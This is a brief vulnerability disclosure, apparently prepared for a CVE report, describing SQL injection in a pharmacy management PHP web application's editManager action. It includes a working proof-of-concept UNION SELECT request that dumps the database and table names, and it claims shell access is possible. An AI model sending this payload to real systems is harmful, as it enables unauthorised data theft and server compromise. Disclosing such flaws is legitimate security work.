## editManager

**Description of the vulnerability**
pharmacy_Management_System latest version has SQL injection, which can get information about the database and even GetShell via SQL injection

**Vulnerability recurrence**

We need to set up this PMS website locally

Let's open the  /Index.php?id=allManager  route

![image-20240723105418419](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723105418419.png)

POC

```
GET /index.php?action=editManager&id=8}'+union+select+1,database(),(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),4,5,6,7,8+order+by+id+limit+0,1--+ HTTP/1.1
```

![image-20240723125248656](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723125248656.png)

Result：We can get the database name, table name, etc

![image-20240723125309098](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723125309098.png)

![image-20240723134203341](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723134203341.png)

Analysis code

![image-20240723130427914](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723130427914.png)

